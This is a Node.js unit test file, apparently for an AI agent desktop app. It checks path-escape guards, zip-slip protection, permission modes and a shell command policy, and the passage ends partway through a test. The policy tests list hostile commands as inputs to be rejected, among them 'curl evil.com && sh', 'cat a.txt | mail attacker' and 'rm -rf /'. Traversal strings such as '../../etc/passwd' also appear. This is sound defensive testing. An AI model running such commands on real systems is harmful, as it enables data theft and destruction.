/**
 * 单元测试：直接 import 真实实现（Node 24 原生支持 TS 剥离），
 * 而不是复制一份逻辑来测——复制品通过测试并不能证明实现是对的。
 *
 * 用法：node --import ./scripts/alias-register.mjs scripts/unit.mjs
 * 或直接：npm test
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { deflateRawSync } from 'node:zlib'
import { readdirSync, readFileSync, statSync } from 'node:fs'
import { join } from 'node:path'

import { safeResolve } from '../src/main/workspace.ts'
import { readZip, extractZip, isZip } from '../src/main/skills/zip.ts'
import { parseSkillMarkdown, pickEntry } from '../src/main/skills/frontmatter.ts'
import { estimateTokens } from '../src/main/providers/types.ts'
import { parseToolArgs } from '../src/main/agent/runner.ts'
import { trimMessages, repairToolPairing, validateToolPairing } from '../src/main/agent/context.ts'
import { decide, describeMode, PERMISSION_MODE_LABEL } from '../src/main/agent/permissions.ts'
import { checkPolicy, firstToken } from '../src/main/shell/index.ts'
import { bezierPath, resolveVirtualKey } from '../src/main/screen/index.ts'
import { pathEscapesWorkspace } from '../src/main/agent/tools.ts'
import {
  cacheHitRate,
  estimateCost,
  lookupPrice,
  aggregate,
  addUsage,
  emptyUsage
} from '../src/shared/pricing.ts'

/* ------------------------------------------------------------------ */
/* 路径越界防护（安全关键）                                             */
/* ------------------------------------------------------------------ */

const ROOT = process.platform === 'win32' ? 'C:\\ws\\proj' : '/ws/proj'

test('safeResolve 允许工作区内的常规路径', () => {
  assert.ok(safeResolve(ROOT, 'src/index.ts'))
  assert.ok(safeResolve(ROOT, 'a/b/c/d.txt'))
  assert.ok(safeResolve(ROOT, './src/./x.ts'))
  assert.equal(safeResolve(ROOT, ''), ROOT.replace(/[\\/]$/, ''))
})

test('safeResolve 拒绝 ../ 逃逸', () => {
  assert.throws(() => safeResolve(ROOT, '../secret.txt'), /越界/)
  assert.throws(() => safeResolve(ROOT, '../../etc/passwd'), /越界/)
  assert.throws(() => safeResolve(ROOT, 'src/../../out.txt'), /越界/)
  assert.throws(() => safeResolve(ROOT, 'a/b/../../../x'), /越界/)
})

test('safeResolve 拒绝绝对路径与非法字符', () => {
  assert.throws(() => safeResolve(ROOT, '\0bad'), /非法字符/)
  // 绝对路径一律拒绝：静默把 /etc/passwd 当成 <ws>/etc/passwd 是危险语义
  assert.throws(() => safeResolve(ROOT, 'D:\\other\\file.txt'), /绝对路径/)
  assert.throws(() => safeResolve(ROOT, '/etc/passwd'), /绝对路径/)
  assert.throws(() => safeResolve(ROOT, '//server/share/x'), /绝对路径/)
  assert.throws(() => safeResolve(ROOT, 'C:/Windows/system32'), /绝对路径/)
})

test('safeResolve 允许含 .. 但最终仍落在根内的路径', () => {
  const p = safeResolve(ROOT, 'src/a/../b.ts')
  assert.ok(p.endsWith('b.ts'))
  assert.ok(!p.includes('..'))
})

/* ------------------------------------------------------------------ */
/* ZIP：解析、解压、zip-slip 防护                                       */
/* ------------------------------------------------------------------ */

/** 手工构造 zip，覆盖 store(0) 与 deflate(8) */
function buildZip(entries) {
  const chunks = []
  const central = []
  let offset = 0

  for (const e of entries) {
    const nameBuf = Buffer.from(e.name, 'utf8')
    const raw = Buffer.from(e.data)
    const useDeflate = e.deflate === true
    const stored = useDeflate ? deflateRawSync(raw) : raw
    const method = useDeflate ? 8 : 0

    const local = Buffer.alloc(30)
    local.writeUInt32LE(0x04034b50, 0)
    local.writeUInt16LE(20, 4)
    local.writeUInt16LE(method, 8)
    local.writeUInt32LE(0, 14)
    local.writeUInt32LE(stored.length, 18)
    local.writeUInt32LE(raw.length, 22)
    local.writeUInt16LE(nameBuf.length, 26)
    chunks.push(local, nameBuf, stored)

    const cd = Buffer.alloc(46)
    cd.writeUInt32LE(0x02014b50, 0)
    cd.writeUInt16LE(20, 4)
    cd.writeUInt16LE(20, 6)
    cd.writeUInt16LE(method, 10)
    cd.writeUInt32LE(0, 16)
    cd.writeUInt32LE(stored.length, 20)
    cd.writeUInt32LE(raw.length, 24)
    cd.writeUInt16LE(nameBuf.length, 28)
    cd.writeUInt32LE(offset, 42)
    central.push(Buffer.concat([cd, nameBuf]))

    offset += local.length + nameBuf.length + stored.length
  }

  const centralBuf = Buffer.concat(central)
  const eocd = Buffer.alloc(22)
  eocd.writeUInt32LE(0x06054b50, 0)
  eocd.writeUInt16LE(entries.length, 8)
  eocd.writeUInt16LE(entries.length, 10)
  eocd.writeUInt32LE(centralBuf.length, 12)
  eocd.writeUInt32LE(offset, 16)
  return Buffer.concat([...chunks, centralBuf, eocd])
}

test('isZip 正确识别 zip 签名', () => {
  assert.equal(isZip(buildZip([{ name: 'a.txt', data: 'x' }])), true)
  assert.equal(isZip(Buffer.from('not a zip at all')), false)
  assert.equal(isZip(Buffer.alloc(2)), false)
})

test('readZip 解析 store 与 deflate 两种压缩方式', () => {
  const zip = buildZip([
    { name: 'SKILL.md', data: '# 我的技能' },
    { name: 'assets/big.txt', data: 'y'.repeat(5000), deflate: true }
  ])
  const entries = readZip(zip)
  assert.equal(entries.length, 2)
  assert.equal(entries[0].name, 'SKILL.md')
  assert.equal(entries[0].data.toString('utf8'), '# 我的技能', 'store 条目内容应一致')
  assert.equal(entries[1].name, 'assets/big.txt')
  assert.equal(entries[1].data.length, 5000, 'deflate 条目应正确解压')
  assert.equal(entries[1].data.toString('utf8'), 'y'.repeat(5000))
})

test('readZip 对损坏输入明确报错', () => {
  assert.throws(() => readZip(Buffer.alloc(4)), /太小|损坏/)
  assert.throws(() => readZip(Buffer.from('x'.repeat(100))), /找不到|损坏/)
})

test('extractZip 正确落盘并返回文件列表', () => {
  const zip = buildZip([
    { name: 'SKILL.md', data: 'hello' },
    { name: 'sub/a.txt', data: 'aaa' }
  ])
  const entries = readZip(zip)
  const written = new Map()
  const dirs = []
  const res = extractZip(
    entries,
    '/tmp/skill',
    {
      mkdirSync: (p) => dirs.push(p),
      writeFileSync: (p, d) => written.set(p.replace(/\\/g, '/'), d.toString('utf8'))
    },
    {
      join: (...p) => p.join('/'),
      resolve: (...p) => {
        // 用 path.posix 语义模拟，测试 zip-slip 判断
        const parts = []
        for (const seg of p.join('/').split('/')) {
          if (seg === '' || seg === '.') continue
          if (seg === '..') parts.pop()
          else parts.push(seg)
        }
        return '/' + parts.join('/')
      },
      relative: (a, b) => {
        const norm = (s) => s.split('/').filter(Boolean)
        const aa = norm(a)
        const bb = norm(b)
        let i = 0
        while (i < aa.length && aa[i] === bb[i]) i++
        return [...aa.slice(i).map(() => '..'), ...bb.slice(i)].join('/') || ''
      }
    }
  )
  assert.equal(res.files.length, 2)
  assert.ok(written.has('/tmp/skill/SKILL.md'))
  assert.equal(written.get('/tmp/skill/SKILL.md'), 'hello')
  assert.equal(written.get('/tmp/skill/sub/a.txt'), 'aaa')
  assert.equal(res.totalBytes, 8)
})

test('extractZip 拒绝 zip-slip 越界路径', () => {
  const zip = buildZip([{ name: '../../evil.sh', data: 'rm -rf /' }])
  const entries = readZip(zip)
  assert.throws(
    () =>
      extractZip(
        entries,
        '/tmp/skill',
        { mkdirSync: () => undefined, writeFileSync: () => undefined },
        {
          join: (...p) => p.join('/'),
          resolve: (...p) => {
            const parts = []
            for (const seg of p.join('/').split('/')) {
              if (seg === '' || seg === '.') continue
              if (seg === '..') parts.pop()
              else parts.push(seg)
            }
            return '/' + parts.join('/')
          },
          relative: (a, b) => {
            const norm = (s) => s.split('/').filter(Boolean)
            const aa = norm(a)
            const bb = norm(b)
            let i = 0
            while (i < aa.length && aa[i] === bb[i]) i++
            return [...aa.slice(i).map(() => '..'), ...bb.slice(i)].join('/') || ''
          }
        }
      ),
    /越界/
  )
})

test('extractZip 遵守文件数与体积上限', () => {
  const zip = buildZip([
    { name: 'a.txt', data: 'x' },
    { name: 'b.txt', data: 'y' }
  ])
  const entries = readZip(zip)
  assert.throws(
    () =>
      extractZip(
        entries,
        '/t',
        { mkdirSync: () => undefined, writeFileSync: () => undefined },
        { join: (...p) => p.join('/'), resolve: (...p) => '/' + p.join('/'), relative: () => 'ok' },
        { maxFiles: 1, maxTotalBytes: 1e6, maxFileBytes: 1e6 }
      ),
    /上限/
  )
})

/* ------------------------------------------------------------------ */
/* Skill frontmatter 解析                                              */
/* ------------------------------------------------------------------ */

test('parseSkillMarkdown 解析 frontmatter 的 name/description', () => {
  const r = parseSkillMarkdown(
    ['---', 'name: banner-design', 'description: 设计横幅与社交图', 'version: 1.2.0', '---', '', '# 正文', '内容'].join('\n')
  )
  assert.equal(r.name, 'banner-design')
  assert.equal(r.description, '设计横幅与社交图')
  assert.equal(r.extra.version, '1.2.0')
  assert.ok(r.body.includes('# 正文'))
})

test('parseSkillMarkdown 去除成对引号', () => {
  const r = parseSkillMarkdown('---\nname: "quoted name"\ndescription: \'单引号\'\n---\nbody')
  assert.equal(r.name, 'quoted name')
  assert.equal(r.description, '单引号')
})

test('parseSkillMarkdown 无 frontmatter 时用首段兜底', () => {
  const r = parseSkillMarkdown('# 标题\n\n这是第一段说明文字。\n\n更多内容')
  assert.equal(r.name, null)
  assert.equal(r.description, '这是第一段说明文字。')
})

test('parseSkillMarkdown 处理仅标题无正文的情况', () => {
  const r = parseSkillMarkdown('# 只有标题')
  assert.equal(r.description, '')
})

test('parseSkillMarkdown 剥离 BOM', () => {
  const r = parseSkillMarkdown('\uFEFF---\nname: bom-test\n---\nbody')
  assert.equal(r.name, 'bom-test')
})

test('parseSkillMarkdown 支持块标量 description', () => {
  const r = parseSkillMarkdown(
    ['---', 'name: multi', 'description: >', '  第一行说明', '  第二行说明', '---', 'body'].join('\n')
  )
  assert.equal(r.name, 'multi')
  assert.match(r.description, /第一行说明/)
  assert.match(r.description, /第二行说明/)
})

/* ------------------------------------------------------------------ */
/* 入口文件挑选                                                        */
/* ------------------------------------------------------------------ */

test('pickEntry 优先根目录 SKILL.md', async () => {
  assert.equal(await pickEntry(['README.md', 'SKILL.md', 'a.txt']), 'SKILL.md')
})

test('pickEntry 在无根入口时向内找一层（zip 常见结构）', async () => {
  assert.equal(await pickEntry(['my-skill/SKILL.md', 'my-skill/notes.txt']), 'my-skill/SKILL.md')
})

test('pickEntry 回落到任意 markdown', async () => {
  assert.equal(await pickEntry(['docs/guide.md']), 'docs/guide.md')
})

test('pickEntry 无 markdown 时明确报错', async () => {
  await assert.rejects(() => pickEntry(['a.txt', 'b.json']), /未找到/)
})

/* ------------------------------------------------------------------ */
/* token 估算                                                          */
/* ------------------------------------------------------------------ */

test('estimateTokens 对空输入返回 0', () => {
  assert.equal(estimateTokens(''), 0)
})

test('estimateTokens 中文约 1 token/字', () => {
  assert.equal(estimateTokens('你好世界'), 4)
  assert.equal(estimateTokens('中文测试内容'), 6)
})

test('estimateTokens 英文约 4 字符/token', () => {
  assert.equal(estimateTokens('abcdefgh'), 2)
  assert.equal(estimateTokens('a'.repeat(100)), 25)
})

test('estimateTokens 中英混排与日韩文字', () => {
  const mixed = estimateTokens('hello 世界')
  assert.ok(mixed >= 3)
  assert.ok(estimateTokens('こんにちは') === 5, '日文假名按 CJK 计')
  assert.ok(estimateTokens('한국어') === 3, '韩文按 CJK 计')
})

/* ------------------------------------------------------------------ */
/* 工具参数解析容错                                                     */
/* ------------------------------------------------------------------ */

test('parseToolArgs 处理标准与包裹的 JSON', () => {
  assert.deepEqual(parseToolArgs('{"path":"a.ts"}'), { path: 'a.ts' })
  assert.deepEqual(parseToolArgs('```json\n{"path":"a.ts"}\n```'), { path: 'a.ts' })
  assert.deepEqual(parseToolArgs('```\n{"path":"a.ts"}\n```'), { path: 'a.ts' })
})

test('parseToolArgs 修复尾随逗号', () => {
  assert.deepEqual(parseToolArgs('{"a":1,}'), { a: 1 })
  assert.deepEqual(parseToolArgs('{"a":[1,2,]}'), { a: [1, 2] })
})

test('parseToolArgs 空输入返回空对象', () => {
  assert.deepEqual(parseToolArgs(''), {})
  assert.deepEqual(parseToolArgs('   '), {})
})

test('parseToolArgs 拒绝数组与非法 JSON', () => {
  assert.deepEqual(parseToolArgs('[1,2]'), {}, '数组不是合法参数对象')
  assert.throws(() => parseToolArgs('{bad json'), /JSON/)
})

/* ------------------------------------------------------------------ */
/* 上下文配对修复（防供应商 400）                                        */
/* ------------------------------------------------------------------ */

test('validateToolPairing 检出孤立 tool 结果', () => {
  const problems = validateToolPairing([{ role: 'tool', toolCallId: 'orphan', content: 'x' }])
  assert.equal(problems.length, 1)
  assert.match(problems[0], /找不到/)
})

test('validateToolPairing 检出缺少结果的调用', () => {
  const problems = validateToolPairing([
    { role: 'assistant', content: '', toolCalls: [{ id: 'c1', name: 'x', argsJson: '{}' }] }
  ])
  assert.equal(problems.length, 1)
  assert.match(problems[0], /缺少/)
})

test('repairToolPairing 剔除孤立 tool 结果', () => {
  const { messages, repairs } = repairToolPairing([
    { role: 'user', content: 'hi', id: '1', createdAt: 0 },
    { role: 'tool', toolCallId: 'orphan', content: 'stray', id: '2', createdAt: 0 }
  ])
  assert.equal(messages.length, 1)
  assert.equal(messages[0].role, 'user')
  assert.ok(repairs.length > 0)
})

test('repairToolPairing 完整保留配对的消息', () => {
  const { messages, repairs } = repairToolPairing([
    { role: 'user', content: 'hi', id: '1', createdAt: 0 },
    {
      role: 'assistant',
      content: '',
      id: '2',
      createdAt: 0,
      toolCalls: [{ id: 'c1', name: 'read_file', argsJson: '{}' }]
    },
    { role: 'tool', toolCallId: 'c1', content: 'body', id: '3', createdAt: 0 }
  ])
  assert.equal(messages.length, 3)
  assert.equal(repairs.length, 0, '配对完整时不应产生修复')
})

test('repairToolPairing 剔除缺结果的调用但保留文本', () => {
  const { messages } = repairToolPairing([
    {
      role: 'assistant',
      content: '让我看看',
      id: '1',
      createdAt: 0,
      toolCalls: [{ id: 'c1', name: 'x', argsJson: '{}' }]
    }
  ])
  assert.equal(messages.length, 1)
  assert.equal(messages[0].toolCalls, undefined)
  assert.equal(messages[0].content, '让我看看')
})

test('repairToolPairing 丢弃无文本且无结果的空 assistant', () => {
  const { messages } = repairToolPairing([
    {
      role: 'assistant',
      content: '   ',
      id: '1',
      createdAt: 0,
      toolCalls: [{ id: 'c1', name: 'x', argsJson: '{}' }]
    }
  ])
  assert.equal(messages.length, 0)
})

test('trimMessages 裁剪后首条不是孤立 tool 结果', () => {
  const msgs = [
    { role: 'user', content: '1', id: '1', createdAt: 0 },
    { role: 'assistant', content: 'a2', id: '2', createdAt: 0 },
    { role: 'user', content: '2', id: '3', createdAt: 0 },
    {
      role: 'assistant',
      content: '',
      id: '4',
      createdAt: 0,
      toolCalls: [{ id: 'c1', name: 'x', argsJson: '{}' }]
    },
    { role: 'tool', toolCallId: 'c1', content: 'r', id: '5', createdAt: 0 },
    { role: 'assistant', content: 'a5', id: '6', createdAt: 0 }
  ]
  const trimmed = trimMessages(msgs, 3)
  assert.notEqual(trimmed[0].role, 'tool', '首条不能是 tool')
  assert.deepEqual(validateToolPairing(trimmed), [], '裁剪结果必须是合法序列')
})

test('trimMessages 在有 tool 结果时保留其调用', () => {
  const msgs = [
    { role: 'user', content: 'q', id: '1', createdAt: 0 },
    {
      role: 'assistant',
      content: '',
      id: '2',
      createdAt: 0,
      toolCalls: [{ id: 'c1', name: 'x', argsJson: '{}' }]
    },
    { role: 'tool', toolCallId: 'c1', content: 'r', id: '3', createdAt: 0 },
    { role: 'assistant', content: 'final', id: '4', createdAt: 0 }
  ]
  const trimmed = trimMessages(msgs, 2)
  assert.deepEqual(validateToolPairing(trimmed), [], '不能产生半截配对')
})

test('trimMessages limit 为 0 时不裁剪', () => {
  const msgs = [{ role: 'user', content: 'x', id: '1', createdAt: 0 }]
  assert.equal(trimMessages(msgs, 0).length, 1)
})

/* ------------------------------------------------------------------ */
/* 用量核算与价格                                                      */
/* ------------------------------------------------------------------ */

test('cacheHitRate 按 命中/总输入 计算', () => {
  assert.equal(cacheHitRate({ inputTokens: 1000, cachedInputTokens: 0 }), 0)
  assert.equal(cacheHitRate({ inputTokens: 1000, cachedInputTokens: 1000 }), 1)
  assert.equal(cacheHitRate({ inputTokens: 1000, cachedInputTokens: 250 }), 0.25)
})

test('cacheHitRate 输入为 0 时返回 0 而非 NaN', () => {
  const r = cacheHitRate({ inputTokens: 0, cachedInputTokens: 0 })
  assert.equal(r, 0)
  assert.ok(!Number.isNaN(r))
})

test('addUsage 累加且 estimated 取或', () => {
  const a = { ...emptyUsage(), inputTokens: 10, outputTokens: 5 }
  const b = { ...emptyUsage(), inputTokens: 3, cachedInputTokens: 2, estimated: true }
  const sum = addUsage(a, b)
  assert.equal(sum.inputTokens, 13)
  assert.equal(sum.outputTokens, 5)
  assert.equal(sum.cachedInputTokens, 2)
  assert.equal(sum.estimated, true)
})

test('lookupPrice 命中精确名与带日期后缀的版本', () => {
  assert.ok(lookupPrice('gpt-4o'))
  assert.ok(lookupPrice('claude-sonnet-4-20250514'), '应命中前缀')
})

test('lookupPrice 对未知模型返回 null 而不是猜价格', () => {
  assert.equal(lookupPrice('totally-unknown-model-xyz'), null)
  assert.equal(lookupPrice(''), null)
})

test('lookupPrice 更长的前缀优先', () => {
  const mini = lookupPrice('gpt-4o-mini')
  const full = lookupPrice('gpt-4o')
  assert.ok(mini && full)
  assert.ok(mini.input < full.input, 'mini 应命中更便宜的价格')
})

test('estimateCost 区分缓存与未缓存输入，不重复计费', () => {
  const model = 'claude-sonnet-4'
  const allFresh = estimateCost(
    { ...emptyUsage(), inputTokens: 1_000_000, outputTokens: 0 },
    model
  )
  const halfCached = estimateCost(
    { ...emptyUsage(), inputTokens: 1_000_000, cachedInputTokens: 1_000_000, outputTokens: 0 },
    model
  )
  assert.ok(allFresh != null && halfCached != null)
  assert.ok(halfCached < allFresh, '缓存命中的输入应更便宜')
  // 全命中缓存时只应按 cachedInput 计价（3.0 * 0.1 = 0.3）
  assert.ok(Math.abs(halfCached - 0.3) < 1e-9, `期望 0.3，实际 ${halfCached}`)
})

test('estimateCost 未知模型返回 null', () => {
  assert.equal(estimateCost({ ...emptyUsage(), inputTokens: 100 }, 'no-such-model'), null)
})

test('aggregate 汇总请求数与命中率', () => {
  const base = {
    at: 0,
    providerId: 'p',
    providerName: 'P',
    kind: 'openai',
    model: 'gpt-4o',
    latencyMs: 1000,
    firstTokenMs: 200,
    tokensPerSecond: 50,
    costUSD: 0.01,
    sessionId: 's',
    failed: false
  }
  const stats = aggregate([
    { ...base, ...emptyUsage(), id: '1', inputTokens: 1000, cachedInputTokens: 800, outputTokens: 100 },
    { ...base, ...emptyUsage(), id: '2', inputTokens: 1000, cachedInputTokens: 200, outputTokens: 300 }
  ])
  assert.equal(stats.requests, 2)
  assert.equal(stats.inputTokens, 2000)
  assert.equal(stats.outputTokens, 400)
  assert.equal(stats.cachedInputTokens, 1000)
  assert.equal(stats.cacheHitRate, 0.5)
  assert.equal(stats.avgFirstTokenMs, 200)
  assert.ok(Math.abs(stats.costUSD - 0.02) < 1e-9)
})

test('aggregate 对空记录集返回零值而非崩溃', () => {
  const stats = aggregate([])
  assert.equal(stats.requests, 0)
  assert.equal(stats.cacheHitRate, 0)
  assert.equal(stats.avgTokensPerSecond, 0)
})

/* ------------------------------------------------------------------ */
/* 权限判定（安全关键）                                                 */
/* ------------------------------------------------------------------ */

const basePolicy = {
  escapesWorkspace: false,
  allowWrite: true,
  capabilityEnabled: true,
  capabilityLabel: '该能力'
}

test('decide：full 模式一切放行', () => {
  for (const risk of ['read', 'write', 'delete', 'remote', 'shell', 'screen']) {
    assert.equal(decide({ ...basePolicy, mode: 'full', risk }).action, 'allow', `full 下 ${risk} 应放行`)
  }
})

test('decide：workspace 模式只放行工作区内写入', () => {
  assert.equal(decide({ ...basePolicy, mode: 'workspace', risk: 'read' }).action, 'allow')
  assert.equal(decide({ ...basePolicy, mode: 'workspace', risk: 'write' }).action, 'allow')
  // 越界写入必须问
  assert.equal(
    decide({ ...basePolicy, mode: 'workspace', risk: 'write', escapesWorkspace: true }).action,
    'ask'
  )
  for (const risk of ['delete', 'remote', 'shell', 'screen']) {
    assert.equal(decide({ ...basePolicy, mode: 'workspace', risk }).action, 'ask', `workspace 下 ${risk} 应询问`)
  }
})

test('decide：smart 模式只读放行，其余询问', () => {
  assert.equal(decide({ ...basePolicy, mode: 'smart', risk: 'read' }).action, 'allow')
  for (const risk of ['write', 'delete', 'remote', 'shell', 'screen']) {
    assert.equal(decide({ ...basePolicy, mode: 'smart', risk }).action, 'ask', `smart 下 ${risk} 应询问`)
  }
})

test('decide：模型自评 high 只加重视觉提示，绝不放宽判定', () => {
  const high = { level: 'high', reason: '会删除用户数据' }
  // full 模式下依然是 allow——自评不改变判定结果
  assert.equal(decide({ ...basePolicy, mode: 'full', risk: 'delete', selfAssessed: high }).action, 'allow')

  const smart = decide({ ...basePolicy, mode: 'smart', risk: 'write', selfAssessed: high })
  assert.equal(smart.action, 'ask')
  assert.equal(smart.escalate, true)
  assert.match(smart.reason, /删除用户数据/)

  // 自评 low 也不能让 smart 放行写操作
  const low = { level: 'low', reason: '只是改个注释' }
  assert.equal(decide({ ...basePolicy, mode: 'smart', risk: 'write', selfAssessed: low }).action, 'ask')
})

test('decide：能力总开关关闭时任何模式都拒绝', () => {
  for (const mode of ['full', 'workspace', 'smart']) {
    const d = decide({ ...basePolicy, mode, risk: 'shell', capabilityEnabled: false, capabilityLabel: '控制台' })
    assert.equal(d.action, 'deny', `${mode} 下关闭能力应拒绝`)
    assert.match(d.reason, /控制台/)
  }
  // 连完全权限也不能绕过用户的显式关闭
  assert.equal(
    decide({ ...basePolicy, mode: 'full', risk: 'screen', capabilityEnabled: false, capabilityLabel: '屏幕' }).action,
    'deny'
  )
})

test('decide：写入总开关关闭时拒绝有副作用的操作，但只读仍放行', () => {
  const off = { ...basePolicy, allowWrite: false }
  assert.equal(decide({ ...off, mode: 'full', risk: 'read' }).action, 'allow')
  for (const risk of ['write', 'delete', 'remote', 'shell']) {
    assert.equal(decide({ ...off, mode: 'full', risk }).action, 'deny', `${risk} 在关闭写入时应拒绝`)
  }
})

/* ------------------------------------------------------------------ */
/* 控制台命令策略（安全关键）                                           */
/* ------------------------------------------------------------------ */

const strictPolicy = { allowlist: [], denylist: ['format', 'shutdown'], allowPipe: false }

test('checkPolicy 拒绝空命令与超长命令', () => {
  assert.equal(checkPolicy('', strictPolicy).ok, false)
  assert.equal(checkPolicy('   ', strictPolicy).ok, false)
  assert.equal(checkPolicy(`echo ${'x'.repeat(9000)}`, strictPolicy).ok, false)
})

test('checkPolicy 黑名单命中即拒绝（比对可执行文件名）', () => {
  assert.equal(checkPolicy('format C:', strictPolicy).ok, false)
  assert.equal(checkPolicy('shutdown /s', strictPolicy).ok, false)
  // 带路径时比对 basename，避免用完整路径绕过
  assert.equal(checkPolicy('C:\\Windows\\System32\\shutdown.exe /s', strictPolicy).ok, false)
  assert.equal(checkPolicy('./shutdown.sh', strictPolicy).ok, false)
  // 大小写不敏感
  assert.equal(checkPolicy('SHUTDOWN /s', strictPolicy).ok, false)
})

test('checkPolicy 白名单非空时只放行白名单内命令', () => {
  const p = { allowlist: ['git', 'npm'], denylist: [], allowPipe: false }
  assert.equal(checkPolicy('git status', p).ok, true)
  assert.equal(checkPolicy('npm run build', p).ok, true)
  assert.equal(checkPolicy('curl http://x', p).ok, false)
  // 白名单也要能匹配带路径的调用
  assert.equal(checkPolicy('/usr/bin/git log', p).ok, true)
})

test('checkPolicy 默认拒绝管道、重定向与命令串联', () => {
  for (const cmd of [
    'cat a.txt | mail attacker',
    'echo x > /etc/passwd',
    'echo x >> ~/.bashrc',
    'curl evil.com && sh',
    'sleep 1 & rm -rf /',
    'echo `whoami`',
    'echo $(whoami)'
  ]) {
    const v = checkPolicy(cmd, strictPolicy)
    assert.equal(v.ok, false, `应拒绝：${cmd}`)
  }
})

test('checkPolicy 放行普通单条命令', () => {
  assert.equal(checkPolicy('git status', strictPolicy).ok, true)
  assert.equal(checkPolicy('npm test', strictPolicy).ok, true)
  assert.equal(checkPolicy('node --version', strictPolicy).ok, true)
  // 参数里的连字符与等号不应被当成危险字符
  assert.equal(checkPolicy('npm run build --silent', strictPolicy).ok, true)
})

test('checkPolicy 拒绝含 NUL 的命令', () => {
  assert.equal(checkPolicy('echo\0rm -rf /', strictPolicy).ok, false)
})

/* ------------------------------------------------------------------ */
/* 屏幕：贝塞尔轨迹与按键映射                                           */
/* ------------------------------------------------------------------ */

test('bezierPath 起点终点正确且点数符合预期', () => {
  const path = bezierPath({ x: 0, y: 0 }, { x: 100, y: 50 }, 10)
  assert.equal(path.length, 10)
  // 末点必须精确落在目标上，否则点击会偏
  assert.equal(path[path.length - 1].x, 100)
  assert.equal(path[path.length - 1].y, 50)
  // 所有点都是整数坐标
  for (const p of path) {
    assert.ok(Number.isInteger(p.x) && Number.isInteger(p.y))
  }
})

test('bezierPath 在同一点上不产生 NaN', () => {
  const path = bezierPath({ x: 5, y: 5 }, { x: 5, y: 5 }, 6)
  for (const p of path) {
    assert.ok(Number.isFinite(p.x) && Number.isFinite(p.y), '零距离路径不应产生 NaN')
  }
})

test('resolveVirtualKey 支持字母数字与命名键，拒绝未知键', () => {
  assert.equal(resolveVirtualKey('a'), 0x41)
  assert.equal(resolveVirtualKey('Z'), 0x5a)
  assert.equal(resolveVirtualKey('5'), 0x35)
  assert.equal(resolveVirtualKey('Enter'), 0x0d)
  assert.equal(resolveVirtualKey('escape'), 0x1b)
  assert.equal(resolveVirtualKey('F5'), 0x74)
  assert.equal(resolveVirtualKey('nosuchkey'), null)
})

/* ------------------------------------------------------------------ */
/* 工作区路径越界判断                                                   */
/* ------------------------------------------------------------------ */

test('pathEscapesWorkspace 识别越界与绝对路径', () => {
  assert.equal(pathEscapesWorkspace('src/index.ts'), false)
  assert.equal(pathEscapesWorkspace('a/b/c.txt'), false)
  assert.equal(pathEscapesWorkspace('../outside.txt'), true)
  assert.equal(pathEscapesWorkspace('src/../../out.txt'), true)
  assert.equal(pathEscapesWorkspace('/etc/passwd'), true)
  assert.equal(pathEscapesWorkspace('C:\\Windows\\x'), true)
  // 只是名字里含点号的文件不算越界
  assert.equal(pathEscapesWorkspace('a..b.txt'), false)
})

/* ------------------------------------------------------------------ */
/* 源码编码完整性（防回归）                                             */
/* ------------------------------------------------------------------ */

/**
 * 门禁：源文件里不允许出现 U+FFFD。
 *
 * 背景：在 Windows PowerShell 5.1 下用 Get-Content / Set-Content 处理 UTF-8
 * 源文件时，内容会先按代码页 936（GBK）解码再以 UTF-8 写出，非 ASCII 字符
 * 会被静默替换成 U+FFFD，且不可逆。这类损坏编译不一定报错，却会悄悄改掉
 * 界面文案。此测试让它在 CI / npm test 阶段立刻暴露。
 */
test('源码不含 U+FFFD 替换字符（编码损坏门禁）', () => {
  const EXT = new Set(['.ts', '.tsx', '.mts', '.js', '.mjs', '.json', '.css', '.html'])
  const SKIP = new Set(['node_modules', 'out', 'dist', '.git', 'shots'])
  const damaged = []

  const walk = (dir) => {
    for (const name of readdirSync(dir)) {
      if (SKIP.has(name)) continue
      const full = join(dir, name)
      if (statSync(full).isDirectory()) {
        walk(full)
        continue
      }
      const dot = name.lastIndexOf('.')
      if (dot < 0 || !EXT.has(name.slice(dot))) continue
      const text = readFileSync(full, 'utf8')
      const n = (text.match(/\uFFFD/g) || []).length
      if (n) damaged.push(`${full}（${n} 处）`)
    }
  }
  walk('.')

  assert.deepEqual(damaged, [], `以下文件含 U+FFFD，疑似编码损坏：\n${damaged.join('\n')}`)
})

test('index.ts 保留了主进程关键接线（重建后防回归）', () => {
  const src = readFileSync('src/main/index.ts', 'utf8')
  // 这些是应用能否启动与权限模型能否生效的关键符号，缺一个都说明文件被截断
  for (const symbol of [
    'registerPluginProtocol',
    'createWindow',
    'registerIpc',
    'assembleDeps',
    'toScreenCoords',
    'resolveShellCwd',
    'runSmokeTest',
    'requestApprovalFor'
  ]) {
    assert.ok(src.includes(symbol), `src/main/index.ts 缺少 ${symbol}`)
  }
  // 截图绝不能写进会话：持久化前必须剔除 images
  assert.ok(src.includes('images: _images'), 'src/main/index.ts 未在持久化前剔除截图')
  // 临时截图脚手架不应残留在生产代码里
  for (const leftover of ['runShotTask', 'LAGENT_SHOT_DIR', 'SETTINGS_DETAIL']) {
    assert.equal(src.includes(leftover), false, `src/main/index.ts 残留临时脚手架 ${leftover}`)
  }
})

/* ------------------------------------------------------------------ */
/* 插件桥的两个历史坑（防回归）                                          */
/* ------------------------------------------------------------------ */

test('worker 不会把已有的 file:// 入口再编码一次', async () => {
  const src = readFileSync('src/main/plugins/worker.mjs', 'utf8')
  // 历史上写成 `import(pathToFileURL(entry).href)`，而宿主传进来的 entry 已经是
  // file:// URL，二次编码会得到 file:\C:\... 这种畸形路径，插件全部加载失败。
  // 现在必须先探测再转换。
  assert.ok(src.includes('entryToUrl'), 'worker.mjs 应通过 entryToUrl 归一化入口路径')
  assert.equal(
    /import\(pathToFileURL\(entry\)/.test(src),
    false,
    'worker.mjs 不应无条件对 entry 再调用 pathToFileURL'
  )
})

test('插件失败时保留结构化错误，不被「退出码」盖掉', () => {
  const src = readFileSync('src/main/plugins/index.ts', 'utf8')
  // 历史上先判断 code !== 0 就 reject，导致 worker 写在 stdout 的
  // { ok:false, error } 被丢弃，插件作者只看到"插件退出码 1"。
  const exitBlock = src.slice(src.indexOf("child.on('exit'"))
  const parseIdx = exitBlock.indexOf('JSON.parse(raw)')
  const codeIdx = exitBlock.indexOf('code !== 0')
  assert.ok(parseIdx >= 0, '应在 exit 回调里尝试解析 stdout 载荷')
  assert.ok(codeIdx >= 0, '应保留退出码兜底分支')
  assert.ok(parseIdx < codeIdx, '必须先解析 stdout 载荷，再回退到退出码判断')
})

test('插件面板调用接上了宿主桥与工作区', () => {
  const src = readFileSync('src/main/plugins/index.ts', 'utf8')
